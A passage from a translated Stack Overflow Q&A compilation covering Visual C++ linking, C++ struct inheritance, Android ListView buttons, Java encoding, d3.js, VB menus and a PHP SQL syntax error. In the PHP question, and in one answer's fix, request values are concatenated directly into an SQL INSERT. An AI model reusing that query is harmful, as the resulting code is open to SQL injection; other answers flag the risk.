/LIBPATH:"..\Student\lib" /LIBPATH:"C:\Program Files (x86)\Microsoft DirectX SDK (March 2009)\Lib\x86" 
"MultiLangD.lib" "datastored.lib" "shlwapi.lib" "ws2_32.lib" "MdxReadd.lib" "winmm.lib" 
"dxguid.lib" "dxerr9.lib" "dinput8.lib" "Messagingd.lib" "dtccd.lib" "Version.lib" 
"SerialTCIMD.lib" "geosrvdll.lib" "NetworkUIDMD.lib" "amp2.lib" "idmmib.lib" 
"vmfr2.lib" "d3dx9.lib" "comsuppwd.lib" "vmf_net_db.lib" "jvmfd.lib" 
/NODEFAULTLIB:"libc" /NODEFAULTLIB:"libcd" /NODEFAULTLIB:"libci" /MANIFEST 
/ManifestFile:".\Debug\WinGFApp.exe.intermediate.manifest" /ALLOWISOLATION 
/MANIFESTUAC:"level='asInvoker' uiAccess='false'" /DEBUG /PDB:".\Debug/CFFTInstrD.pdb" 
/SUBSYSTEM:WINDOWS
 /PGD:"C:\WorkSpaces\WorkSpace_CFFT_II_i18n\CFFT_i18n_MBCS\CFFT\Instructor\Debug\WinGFApp.pg
d" /TLBID:1 /DYNAMICBASE /NXCOMPAT /MACHINE:X86 /ERRORREPORT:QUEUE 
```

这是编译器命令行：

```
/I"." /I"..\Instructor\csw" /I"..\Instructor\CFFTInstr" /I"..\Student\common" 
/I"..\Student\Messaging" /I"..\Student\geotrans" /I"..\SerialTcim" /I"..\AudioServer" 
/I"..\NetworkUIDM\UIDM_Include" /I"..\NetworkUIDM\UIDM_JVMF" /I"..\NetworkUIDM" 
/I"..\Instructor\cas" /I"..\Jvmf" /I"..\Instructor\JvmfGui" /I"..\Instructor\JvmfCff" 
/I"..\NLOS" /I"C:\Program Files (x86)\Microsoft DirectX SDK (March 2009)\Include" /Zi 
/nologo /W3 /WX- /Od /Oy- /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "NO_MSGS" /D 
"INSTRUCTOR" /D "_CRT_SECURE_NO_DEPRECATE" /D "_CRT_SECURE_CPP_OVERLOAD_STANDARD_NAMES" 
/D "_CRT_NONSTDC_NO_DEPRECATE" /D "_VC80_UPGRADE=0x0600" /D "_MBCS" /Gm- /EHsc /RTC1 
/MTd /GS /fp:precise /Zc:wchar_t /Zc:forScope /Yu"stdafx.h" /Fp".\Debug/WinGFApp.pch" 
/Fa".\Debug/" /Fo".\Debug/" /Fd".\Debug/" /FR".\Debug\" /Gd /analyze-/errorReport:queue 
```

当我在 np++ 中打开 .vcxproj 文件并搜索 MultiLang.lib 时，它仅在发布版本中显示为依赖项，而在调试版本设置中列出了 MultiLangD.lib。这是 .vcxproj 文件中的调试设置 ItemDefinitionGroup 节点：

```
</ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
<Midl>
  <PreprocessorDefinitions>_DEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
  <MkTypLibCompatible>true</MkTypLibCompatible>
  <SuppressStartupBanner>true</SuppressStartupBanner>
  <TargetEnvironment>Win32</TargetEnvironment>
  <TypeLibraryName>.\Debug/WinGFApp.tlb</TypeLibraryName>
  <HeaderFileName>
  </HeaderFileName>
</Midl>
<ClCompile>
  <Optimization>Disabled</Optimization>
  <AdditionalIncludeDirectories>.;..\Instructor\csw;..\Instructor\CFFTInstr;..\Student\common;..\Student\Messaging;..\Student\geotrans;..\SerialTcim;..\AudioServer;..\NetworkUIDM\UIDM_Include;..\NetworkUIDM\UIDM_JVMF;..\NetworkUIDM;..\Instructor\cas;..\Jvmf;..\Instructor\JvmfGui;..\Instructor\JvmfCff;..\NLOS;C:\Program Files %28x86%29\Microsoft DirectX SDK %28March 2009%29\Include;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
  <PreprocessorDefinitions>WIN32;_DEBUG;_WINDOWS;NO_MSGS;INSTRUCTOR;_CRT_SECURE_NO_DEPRECATE;_CRT_SECURE_CPP_OVERLOAD_STANDARD_NAMES;_CRT_NONSTDC_NO_DEPRECATE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
  <BasicRuntimeChecks>EnableFastChecks</BasicRuntimeChecks>
  <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
  <PrecompiledHeader>Use</PrecompiledHeader>
  <PrecompiledHeaderFile>stdafx.h</PrecompiledHeaderFile>
  <PrecompiledHeaderOutputFile>.\Debug/WinGFApp.pch</PrecompiledHeaderOutputFile>
  <AssemblerListingLocation>.\Debug/</AssemblerListingLocation>
  <ObjectFileName>.\Debug/</ObjectFileName>
  <ProgramDataBaseFileName>.\Debug/</ProgramDataBaseFileName>
  <BrowseInformation>true</BrowseInformation>
  <WarningLevel>Level3</WarningLevel>
  <SuppressStartupBanner>true</SuppressStartupBanner>
  <DebugInformationFormat>ProgramDatabase</DebugInformationFormat>
</ClCompile>
<ResourceCompile>
  <PreprocessorDefinitions>_DEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
  <Culture>0x0409</Culture>
</ResourceCompile>
<Link>
  <AdditionalDependencies>MultiLangD.lib;datastored.lib;shlwapi.lib;ws2_32.lib;MdxReadd.lib;winmm.lib;dxguid.lib;dxerr9.lib;dinput8.lib;Messagingd.lib;dtccd.lib;Version.lib;SerialTCIMD.lib;geosrvdll.lib;NetworkUIDMD.lib;amp2.lib;idmmib.lib;vmfr2.lib;d3dx9.lib;comsuppwd.lib;vmf_net_db.lib;jvmfd.lib;%(AdditionalDependencies)</AdditionalDependencies>
  <SuppressStartupBanner>true</SuppressStartupBanner>
  <AdditionalLibraryDirectories>..\Lib;..\Student\lib;C:\Program Files %28x86%29\Microsoft DirectX SDK %28March 2009%29\Lib\x86;%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
  <IgnoreSpecificDefaultLibraries>libc;libcd;libci;%(IgnoreSpecificDefaultLibraries)</IgnoreSpecificDefaultLibraries>
  <GenerateDebugInformation>true</GenerateDebugInformation>
  <ProgramDatabaseFile>.\Debug/CFFTInstrD.pdb</ProgramDatabaseFile>
  <SubSystem>Windows</SubSystem>
  <TargetMachine>MachineX86</TargetMachine>
</Link>
<Bscmake>
  <SuppressStartupBanner>true</SuppressStartupBanner>
  <OutputFile>Debug/CFFTInstrD.bsc</OutputFile>
</Bscmake>
<PostBuildEvent>
  <Message>Copy Executable</Message>
  <Command>if not exist ..\exec mkdir ..\exec
    copy debug\WinGFApp.exe ..\exec\CFFTInstrD.exe
  </Command>
</PostBuildEvent>
<ProjectReference />
<ProjectReference>
  <UseLibraryDependencyInputs>true</UseLibraryDependencyInputs>
  <LinkLibraryDependencies>false</LinkLibraryDependencies>
</ProjectReference>
</ItemDefinitionGroup> 
```

不幸的是，生成的所有可执行文件和 dll 都作为构建后事件复制到一个目录中，因此我必须遵循“附加 D”命名约定以避免覆盖来自其他构建的工件。我不确定为什么构建中的其他 dll 项目都没有这个问题。我显然在这里遗漏了一些东西，但无法弄清楚它是什么。有人可以告诉我我做错了什么以及如何做到这一点。谢谢。

**编辑** 我忘了提到我还尝试在 Common Properties->Framework and References 中添加对项目的引用。

![参考设置](../Images/8d52d48a230698dfc4ab2461b7797855.png)

此外，在编译过程中，我看到`Automatically linking with MultiLang.lib`滚动。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T17:05:22.200

好的，我得到它的工作。我删除了引用并将 Linker->General->Ignore Import Library 设置为 Yes。我将其他所有内容保持不变，现在它可以编译和链接了。

# c++ - 除了结构名称之外，“struct”和“{”之间可以保留什么？

> ID：15092844
> 
> 赞同：2
> 
> 时间：2013-02-26T15:25:07.387
> 
> 标签：c++, struct

[here] 给出了如何在 C++ 中使用数据结构的清晰示例。[1](http://www.cplusplus.com/doc/tutorial/structures/)这是链接页面上给出的示例之一：

```
struct product {
  int weight;
  float price;
} ;

product apple;
product banana, melon; 
```

但是，我有一个不遵循此模板的代码，我无法理解它。我所拥有的如下：

```
struct result : mppp::data::table <
    row<semantics::user,       int>,
    row<semantics::exitdatum, spmm::date>,
    row<userid,                int>
> {}; 
```

我不明白为什么我们有如此复杂的结构而不是结构名称，以及应该如何理解它。此外，我不明白为什么结构的“主体”是空的（“{”和“}”之间没有任何内容）。

有人可以解释一下吗？

**添加**

谢谢你的回答。现在更清楚了。上`:`例中的 表示继承。但是所有这些结构意味着什么：`aaa<bbb>`？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-26T15:28:51.243

该代码使用*继承*。您可以在其名称之后指定 a 的基类，用字符`struct`分隔它们，并且可能使用、或限定符之一来指定继承类型（如果未指定则为默认值 (*)）：`:``public``protected``private``public`

```
struct A { }; // Fine

struct B : public A { }; // Also fine

struct C : B { }; // Fine again, `public` is assumed by default

struct D : A, B { }; // Also possible (multiple inheritance)

struct E { };

struct F : public E, private D { } // Qualifiers can differ

struct : A, F { } obj; // structs can be anonymous 
```

在您的情况下，基类是模板的一个实例：

```
template<typename T>
struct X { };

struct Y : X<A> { }; // Fine 
```

* * *

(*)*还值得一提的是，虽然相同的限定符适用于`class`类型的继承，但默认情况下假定为`private`这种情况。*

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-26T15:27:55.913

它继承了一个模板，但没有添加它自己的任何字段。

您必须阅读 C++ 教程。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-26T15:28:07.453

就像 中的情况一样是继承`class`。因此，在您的示例中，`struct result`继承了另一个类或 struct `mppp::data::table < row<semantics::user, int>, row<semantics::exitdatum, spmm::date>, row<userid, int> >`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-26T15:28:25.610

A`struct`等价于 a `class`（默认访问级别除外）。您也可以继承结构或类。`mppp::data::table < row<semantics::user, int>, row<semantics::exitdatum, spmm::date>, row<userid, int>`就是这样 - 一个专门的模板类。

# android - 带有多个按钮的 Android ListView 自定义行与 OnClickListener 存在问题它会影响多个列表项

> ID：15092845
> 
> 赞同：2
> 
> 时间：2013-02-26T15:25:09.350
> 
> 标签：android, listview, button, adapter, onclicklistener

你好，我已经在论坛上搜索了几个小时，并决定提出一个问题，因为我真的找不到我的代码有什么问题。我有一个 ListView 后跟一个自定义适配器。我的 listView 中的每个项目看起来像这样 "|txtView| |Btn 0| |Btn 1| |Btn 2|" 我正在使用 ViewHolder 来提高性能。我使用自定义适配器中的 setOnClickListener 。单击的每个按钮都应将其背景更改为绿色，其他按钮更改为灰色。

我的**问题**是，当单击某个行项目的某个按钮时，它还会**更改**另一行另一个按钮的背景。我似乎没有找到我的问题，我猜这与我使用 ViewHolder 的重用能力有关。

希望各位大神帮忙，万分感谢。

这是我在适配器中的 getView

```
@Override
public View getView(int position, View convertView, ViewGroup parent) {
    ViewHolder holder = null;

    if (convertView == null) {
        convertView = mInflater.inflate(R.layout.bet_list_item, null);

        holder = new ViewHolder();

        holder.tvGameDescription = (TextView) convertView
                .findViewById(R.id.gameDescription);
        holder.button0 = (Button) convertView
                .findViewById(R.id.button0);
        holder.button1 = (Button) convertView
                .findViewById(R.id.button1);
        holder.button2 = (Button) convertView
                .findViewById(R.id.button2);

        convertView.setTag(holder);
    } else {

        holder = (ViewHolder) convertView.getTag();

    }

    MyOnclickListener myOnclickListener = new MyOnclickListener(holder);         

    holder.buttonSide1.setOnClickListener(myOnclickListener);
    holder.buttonSideX.setOnClickListener(myOnclickListener);
    holder.buttonSide2.setOnClickListener(myOnclickListener); 
```

这是监听器实现：

```
private class MyOnclickListener implements OnClickListener {

    private ViewHolder viewHolder;
    boolean[] buttonsClickStatus = { false, false, false }; //all gray at start and not clicked

    public MyOnclickListener(ViewHolder viewHolder) {
        this.viewHolder = viewHolder;
    }

    @Override
    public void onClick(View v) {
        switch (((Data) v.getTag()).getBtnPosition()) { 

        case Consts.BUTTON_0:
        if (!buttonsClickStatus[0]) { // case the btn is gray unclicked
                setButtonsaBackground(0); // changes the background 
                buttonsClickStatus[0] = true;
                buttonsClickStatus[1] = false;
                buttonsClickStatus[2] = false;
        } else { // case already green clicked already
                addOrRemove = false;
                setButtonsaBackground(3);
                for (int i = 0; i < buttonsClickStatus.length; i++) {
                buttonsClickStatus[i] = false;
            }
        }

        break;

        case Consts.BUTTON_1:
            if (!buttonsClickStatus[1]) { // case gray
                setButtonsaBackground(1);
                buttonsClickStatus[1] = true;
                buttonsClickStatus[0] = false;
                buttonsClickStatus[2] = false;
            } else { // case already green
                addOrRemove = false;
                setButtonsaBackground(3);
                for (int i = 0; i < buttonsClickStatus.length; i++) {
                    buttonsClickStatus[i] = false;
                }
            }
            break;

        case Consts.BUTTON_2:
            if (!buttonsClickStatus[2]) { // case gray
                setButtonsaBackground(2);
                buttonsClickStatus[2] = true;
                buttonsClickStatus[0] = false;
                buttonsClickStatus[1] = false;
            } else { // case already green
                addOrRemove = false;
                setButtonsaBackground(3);
                for (int i = 0; i < buttonsClickStatus.length; i++) {
                buttonsClickStatus[i] = false;
                }
            }
            break;

        default:
            break;
        }

                    //call a function to update data only in the activity
        myActivity.update((Data) v.getTag());

    } 
```

SetBackground 作为私有方法在侦听器内部：

```
 private void setButtonsaBackground(int clicked) {
        switch (clicked) {
        case 0:

            viewHolder.button0.setBackgroundColor(Color.GREEN);
            viewHolder.button1.setBackgroundColor(Color.GRAY);
            viewHolder.button2.setBackgroundColor(Color.GRAY);

            break;
        case 1:

            viewHolder.button1.setBackgroundColor(Color.GREEN);
            viewHolder.button0.setBackgroundColor(Color.GRAY);
            viewHolder.button2.setBackgroundColor(Color.GRAY);

            break;
        case 2:

            viewHolder.button2.setBackgroundColor(Color.GREEN);
            viewHolder.button0.setBackgroundColor(Color.GRAY);
            viewHolder.button1.setBackgroundColor(Color.GRAY);
            break;

        case 3:
            viewHolder.button2.setBackgroundColor(Color.GRAY);
            viewHolder.button0.setBackgroundColor(Color.GRAY);
            viewHolder.button1.setBackgroundColor(Color.GRAY);
            break;

        default:
            break;
        }

    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T09:49:19.877

我已经通过以下方式解决了这个问题：

我标记`holder`了`button`。

```
 holder.btnSetLock.setTag(holder);
 holder.btnUnLock.setTag(holder); 
```

我通过以下方式设置了背景颜色：

```
holder.btnUnLock.setOnClickListener(new OnClickListener() {

  @Override
  public void onClick(View v) {
 // TODO Auto-generated method stub
 // Button btn = Button(v);
   holder = (ViewHolder) v.getTag();
   holder.btnSetLock.setBackgroundResource(R.drawable.btn_lock_bg_right);
holder.btnUnLock.setBackgroundResource(R.drawable.btn_unlock_bg_left);

}
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T16:10:41.010

嘿，当我在做一个项目时，我刚刚遇到过类似的问题，当时是紧急情况，我发现了一些不太好的解决方案。

我所做的只是在您的 getView() 方法的 if 条件中为文本视图或按钮提供了唯一的内容描述，然后检查 onclick() 方法是否被覆盖。

将尝试为此找到更好的解决方案。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-26T15:39:18.420

在您的 getview 方法中。

```
 if(posiiton==0)
 {
   holder.buttonSide1.setOnClickListener(myOnclickListener);
 } 
```

而不是使用 if 条件，您可以使用

```
 for(int i=0;i<yourlisitemcount;i++)
 {
 if(position==i)    //make sure you click the button in appropriate listview position
  {
    holder.buttonSide1.setOnClickListener(myOnclickListener);
  }
 } 
```

编辑 - 下面的代码对我有用。

```
 vh.b1=(Button)arg1.findViewById(R.id.b1);//button 1
            vh.b2=(Button)arg1.findViewById(R.id.b2);// button2

            vh.b1.setOnClickListener(new OnClickListener()
            {

                public void onClick(View v) {
                    if(position==1)
                    {
                        vh.b1.setBackgroundColor(Color.RED);
                        vh.b2.setBackgroundColor(Color.GREEN);
                    }

                }

            }); 
```

# java - Java：Windows 和 Linux 中不同的字符编码

> ID：15092850
> 
> 赞同：1
> 
> 时间：2013-02-26T15:25:15.740
> 
> 标签：java, csv, unicode, character-encoding

我必须使用 Java 读取 CSV 文件，并且我正在使用 Super CSV 库进行读取。如果我使用文本编辑器（在 Windows 或 linux 中）打开 CSV 文件，我可以看到如下一行：

```
6;;07/01/1939;58;22;47;49;69;  -   ;  -   ;  -   ;  -   ;  -   ; 
```

似乎包含“ - ”的单元格在 Linux 上从 java 读取为“� - �”，在 Windows 上读取为“á - á”。我需要正确的表示，因为我必须进行比较。现在我正在初始化一个字符串变量=“\uFFFD - \uFFFD”（因为我是在linux上开发的），但是这段代码在windows上不起作用。

任何不同于首先读取文件以检查字符（当前文件无法拥有它）或基于操作系统初始化字符串（我将作为临时解决方案实施）的解决方案？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-26T15:29:52.163

您应该知道 CSV 文件的实际编码方式。

如果您在正确显示它的文本编辑器中打开它，您应该在该编辑器中找出使用了哪种编码。（例如，记事本++中的编码菜单项就是其中之一）。

比在 java 中阅读时可以指定它。

此处使用 utf-8 的示例：

```
FileInputStream fis = new FileInputStream("test.txt"); 
InputStreamReader in = new InputStreamReader(fis, "UTF-8"); 
```

或者

```
Scanner scanner = new Scanner(file, "UTF-8"); 
```

问题可能是在 windows 和 linux 上使用了不同的默认字符集。

（请参阅：[http](http://www.javapractices.com/topic/TopicAction.do?Id=42) ://www.javapractices.com/topic/TopicAction.do?Id=42 ，其中声明：**FileReader 和 FileWriter 类有点棘手，因为它们隐式使用系统的默认字符编码。**）

# d3.js - 在文本标签 d3.js 中显示实时数据

> ID：15092853
> 
> 赞同：1
> 
> 时间：2013-02-26T15:25:21.460
> 
> 标签：d3.js, label, real-time

我有一个折线图，随着数据以 5 秒的间隔从数据库中提取，它正在更新。

[https://gist.github.com/Majella/5fc4cd5f41a6ddf2df23](https://gist.github.com/Majella/5fc4cd5f41a6ddf2df23)

我想在图表的右上角添加一个标签，该标签将显示日期/时间（存储为变量 dateTimeTaken）并在拉入新数据时更新此标签？

我一直在网上搜索，似乎在任何地方都找不到这样的例子——有人能帮忙吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:49:50.350

这应该很容易。根据您的要点，例如：

```
d3.json("getdata.php", function(error,data) {
  data.forEach(function(d) {
    d.dateTimeTaken = parseDate(d.dateTimeTaken);
    d.reading = +d.reading;
  });
var maxDate = d3.max( data, function(d) { return d.dateTimeTaken; } 

svg.selectAll( ".timeDisplay" )
  .data( [maxDate] )
  .text( function(d) { return d; } )
  .enter()
  .append("text")
  .attr("class", "timeDisplay" )
  .attr("x", width )
  .attr("y", 0)
  .attr("text-anchor", "end" )
  .text( dateTimeTaken ); 
```

把它放在你的“updateData”函数中。鉴于您正在接收多个数据项，您可能需要对数据执行“d3.max()”调用以确定要显示的日期。

# unix - 如何以递归方式在 Java 中复制文件夹及其所有内容，包括符号链接

> ID：15092855
> 
> 赞同：1
> 
> 时间：2013-02-26T15:25:24.420
> 
> 标签：unix, symlink, aix, java-6

目前，使用 Java 6，我使用 FileUtils.copyDirectory() 递归地复制文件夹及其所有内容。但是（在 AIX 上）由于符号链接而失败。特别是，一个子文件夹包含符号链接

```
$ ll javaws
lrwxrwxrwx    1 me   staff            13 Feb 21 13:11 javaws -> ../bin/javaws
>>>>> me@machine: /home/me/runtime/jvm/jre/bin <<<<< 
```

我可以使用命令“cp -rh”复制 AIX 上的整个文件夹层次结构。没有 -r 选项，cp 失败，与 FileUtils.copyDirectory() 出现相同的问题（有太多级别的符号链接无法转换路径名。）我没有测试过。但我想这个问题也存在于其他 Unix 变体上。

如上所述，FileUtils 不起作用。从 Java 调用“cp -rh”也不是解决方案：我需要一个适用于许多 Unix 和 Linux 变体的解决方案，并且更喜欢 Java 解决方案。

# vb6 - 没有表单激活的自定义 MsgBox 被触发

> ID：15092861
> 
> 赞同：2
> 
> 时间：2013-02-26T15:25:37.517
> 
> 标签：vb6, msgbox

我开发了一个自定义 MsgBox，几乎在所有方面都可以正常工作。唯一的问题是当 MsgBox 关闭父窗体时运行 Form_Activate 代码。普通的 MsgBox 不会（再次）运行该代码。

我知道我可以向 Form_Activate 添加一个布尔变量来检查它是否已经触发，但是当你有十几个表单时，这不是最好的解决方案。那么，有没有办法在关闭我的自定义 MsgBox 后不运行 Form_Activate？MsgBox 表单是否需要某种特殊类型或其他东西？我尝试了所有 BorderStyles 但这没有任何区别。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-26T22:55:22.937

您是否正在使用其他表单来制作自定义 MsgBox？

您不应该直接使用其他形式来显示自定义消息框。您应该创建一个 Activex 控件，并且当 MsgBox 关闭时，Activate 事件不会再次触发。

如果需要，您可以在控件中使用表单。（可能只需将代码放在 ActiveX 控件项目中并在表单中使用它）

我就是这样用的。

这是一个使用 Activex 控件的自定义 MsgBox 示例，也带有一个测试表单。

[http://www.codeguru.com/code/legacy/vb_othctrl/2166_CustomMsgBox.zip](http://www.codeguru.com/code/legacy/vb_othctrl/2166_CustomMsgBox.zip)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-03-20T10:38:29.303

我为自定义 MsgBox 创建了一个类。

```
Public Class CustomMsgBox
'Creates the Main form
Dim Main As New Form

'Creates the buttons
Dim Btn1, Btn2, Btn3 As New Button

'Creates the label
Dim Lbl As New Label

'Creates the Output variable
Dim Output As Integer = 0

Private Sub Load()
    'Btn1 properties
    Btn1.Location = New Point(168, 69)
    Btn1.AutoSize = True
    Btn1.AutoSizeMode = AutoSizeMode.GrowOnly

    'Btn2 properties
    Btn2.Location = New Point(87, 69)
    Btn1.AutoSize = True
    Btn1.AutoSizeMode = AutoSizeMode.GrowOnly

    'Btn3 properties
    Btn3.Location = New Point(6, 69)
    Btn1.AutoSize = True
    Btn1.AutoSizeMode = AutoSizeMode.GrowOnly

    'Lbl properties
    Lbl.Location = New Point(12, 19)
    Lbl.AutoSize = True
    Lbl.AutoEllipsis = True

    'Main form properties
    Main.Size = New Size(211, 129)
    Main.AutoSize = True
    Main.AutoSizeMode = AutoSizeMode.GrowOnly
    Main.ShowIcon = False
    Main.Controls.Add(Btn1)
    Main.Controls.Add(Btn2)
    Main.Controls.Add(Btn3)
    Main.Controls.Add(Lbl)

    'Adds Handlers to the buttons
    AddHandler Btn1.Click, AddressOf btn1_Click
    AddHandler Btn2.Click, AddressOf btn2_Click
    AddHandler Btn3.Click, AddressOf btn3_Click

End Sub

Function CstMsgBox(ByRef Msg As String, ByRef Title As String, ByRef B1 As String, Optional ByRef B2 As String = Nothing, Optional ByRef B3 As String = Nothing) As Integer
    'Runs the Load() Sub
    Load()

    'Sets the values
    Lbl.Text = Msg
    Btn1.Text = B1
    Btn2.Text = B2
    Btn3.Text = B3
    Main.Text = Title

    'Checks if there is a value set to Btn2 and Btn3
    If Btn2.Text = Nothing Then
        Btn2.Hide()
    End If
    If Btn3.Text = Nothing Then
        Btn3.Hide()
    End If

    'Shows the MsgBox
    Main.Show()

    'Waits until a button is pressed
    Do Until Output <> 0
        Application.DoEvents()
    Loop

    'Closes the MsgBox
    Main.Close()
    Return Output

End Function

Private Sub btn1_Click(ByVal sender As Object, ByVal e As EventArgs)
    'Sets the Output value to 1
    Output = 1

End Sub

Private Sub btn2_Click(ByVal sender As Object, ByVal e As EventArgs)
    'Sets the Output value to 2
    Output = 2

End Sub

Private Sub btn3_Click(ByVal sender As Object, ByVal e As EventArgs)
    'Sets the Output value to 3
    Output = 3

End Sub
End Class 
```

您可以通过键入以下内容来使用它：

```
Dim CMB As New CustomMsgBox
    CCMB.CstMsgBox('MSG, 'TITLE, 'BUTTON1, 'Optional: BUTTON2, 'Optional: BUTTON3) 
```

或者

```
Dim CMB As New CustomMsgBox
    Select Case CMB.CstMsgBox('MSG, 'TITLE, 'BUTTON1, 'Optional: BUTTON2, 'Optional: BUTTON3)
        Case 1
            'Code to execute when button1 is pressed
        Case 2
            'Code to execute when button2 is pressed
        Case 3
            'Code to execute when button3 is pressed
    End Select 
```

# vb.net - VB.NET Windows 窗体上下文菜单位置

> ID：15092865
> 
> 赞同：2
> 
> 时间：2013-02-26T15:25:42.790
> 
> 标签：vb.net, properties, datagridview, position, contextmenu

我正在增强以前编写的 VB.NET WINdows 窗体应用程序。

在其中一个表单中，有一个 DataGridView 从表单加载时的存储过程中填充。

如果用户有权限，当用户右键单击 datagridview 中的记录时，我想显示一个允许用户删除记录的上下文菜单。

这是我的代码：

```
Private Sub m_SetEnabledContextMenu()
  ' for Delete record
  If Not objUser.HasAuthority("Delete Record") Then
    Me.DataGridView1.ContextMenu = Nothing
    Me.mnuContextEquationSubmission.Enabled = False
  Else
    ' Me.DataGridView1.ContextMenu = Me.mnuContextEquationSubmission
    Me.mnuContextEquationSubmission.Enabled = True
  End If
  'Rest is not problem
End Sub

Private Sub DataGridView1_CellMouseDown(ByVal sender As Object, _
        ByVal e As System.Windows.Forms.DataGridViewCellMouseEventArgs) _
            Handles DataGridView1.CellMouseDown
  If e.Button = System.Windows.Forms.MouseButtons.Right Then
    For Each row As DataGridViewRow In DataGridView1.SelectedRows
      row.Selected = False
    Next
    DataGridView1.Rows(e.RowIndex).Selected = True

    'MessageBox.Show("DataGridView1_CellMouseDown on row " & e.RowIndex.ToString)
    m_intSelRow = e.RowIndex
    m_intSelCol = e.ColumnIndex

    m_strRecordID = DataGridView1.Rows(e.RowIndex).Cells(0).Value

    'mnuContextEquationSubmission.Show(DataGridView1, e.Location)
    mnuContextEquationSubmission.Show(CType(sender, Control), e.Location)
  End If
End Sub 
```

如您所见，在“m_SetEnabledContextMenu”过程中，我确定用户是否有权删除记录，因此上下文菜单将被激活（或者至少，这是我想要的） - 而用户没有'没有权限，菜单应该是不可见和禁用的。

在事件处理程序 DataGridView1_CellMouseDown 中，如果是右键单击并且用户单击了数据行，那么我希望上下文菜单显示鼠标所在的位置，而不是顶部！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-26T15:30:28.823

采用`mnuContextEquationSubmission.Show(Me, Me.PointToClient(MousePosition))`

# php - 此 SQL 查询中的语法错误是什么？

> ID：15092866
> 
> 赞同：1
> 
> 时间：2013-02-26T15:25:42.903
> 
> 标签：php, mysql, sql

我试图解决这个错误很长一段时间，也许我是盲人，但我看不出有什么问题。

```
$query = "INSERT INTO `130225` (`vote`,`ip`) VALUES (".$_POST['130225'].",".$_SERVER['REMOTE_ADDR'].");"; 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-26T15:26:42.050

the`IP`没有用单引号括起来（*如果它是一个字符串*），

```
$query = "INSERT INTO `130225` (`vote`,`ip`) VALUES (".$_POST['130225'].",'".$_SERVER['REMOTE_ADDR']."');";
//                                                                        ^                           ^ 
```

作为旁注，[`SQL Injection`](http://bobby-tables.com/)如果变量的值（*s*）来自外部，则查询很容易受到攻击。请看下面的文章，了解如何预防。通过使用`PreparedStatements`，您可以摆脱在值周围使用单引号。

*   [如何*防止*PHP 中的 SQL 注入？](https://stackoverflow.com/questions/60174/how-to-prevent-sql-injection-in-php)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T15:27:55.107

看起来您在值所在的位置缺少一些“'”。

```
$query = "INSERT INTO `130225` (`vote`,`ip`) VALUES ('".$_POST['130225']."','".$_SERVER['REMOTE_ADDR']."');"; 
```

如果将查询粘贴到数据库中，则更容易对查询进行故障排除。会有一个有用的（有时不是..）错误消息。

我从您查询中得到的错误是

```
#1054 - Unknown column 'text here' in 'field list' 
```

谷歌这个错误，会有如何解决它的提示。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-26T16:11:16.320

最好使用准备好的语句来避免类似的问题。像这样，您无需担心报价。

```
$mysqli = new mysqli('localhost', 'my_user', 'my_password', 'world'); 
```

查询必须如下所示：

$stmt = $mysqli->prepare("INSERT INTO 130225 (vote,ip) VALUES (?,?));

然后绑定参数：

$stmt->bind_param('ss', $_POST['130225'],$_SERVER['REMOTE_ADDR']);

ETC...

# javascript - 了解 IE 安全警告的结果

> ID：15092867
> 
> 赞同：0
> 
> 时间：2013-02-26T15:25:43.600
> 
> 标签：javascript, internet-explorer

我正在打开一个启动桌面应用程序的弹出窗口：

```
window.open('myDesktopApp:myargs', 'popup', 'left=100,top=100,height=200,width=500'); 
```

但是，IE8 会显示一条警告，询问“您要允许此网站在您的计算机上打开程序吗？”

在我粘贴代码的地方，我想知道用户是否允许这样做。这可能吗？如果可以，怎么做？

问候

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T08:57:38.933

如果其他人有这个问题：似乎无法知道用户是否允许桌面应用程序运行。它是在 javascript 引擎之外确定的，因此取决于浏览器。

# java - 如何知道 BufferedReader 的字节读取（偏移）？

> ID：15092869
> 
> 赞同：5
> 
> 时间：2013-02-26T15:25:57.233
> 
> 标签：java, io

我想逐行读取文件。BufferedReader 比 RandomAccessFile 或 BufferedInputStream 快得多。但问题是我不知道我读了多少字节。如何知道读取的字节数（偏移量）？我试过了。

```
String buffer;
int offset = 0;

while ((buffer = br.readLine()) != null)
    offset += buffer.getBytes().length + 1; // 1 is for line separator 
```

如果文件很小，我可以工作。但是，当文件变大时，偏移量会小于实际值。我怎样才能得到抵消？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-02-26T15:43:37.237

`BufferedReader`由于两种影响，没有简单的方法可以做到这一点：字符结尾编码和行结尾。在 Windows 上，行尾`\r\n`是两个字节。在 Unix 上，行分隔符是一个字节。`BufferedReader`将在您不注意的情况下处理这两种情况，因此在 之后`readLine()`，您将不知道跳过了多少字节。

也`buffer.getBytes()`仅当您的默认编码和文件中数据的编码意外碰巧相同时才返回正确的结果。当使用任何类型的`byte[]`<->`String`转换时，您应该**始终**准确地指定应该使用哪种编码。

您也不能使用计数`InputStream`，因为缓冲读取器以大块读取数据。因此，在读取第一行（例如 5 个字节）后，内部计数器`InputStream`将返回 4096，因为读取器总是将那么多字节读入其内部缓冲区。

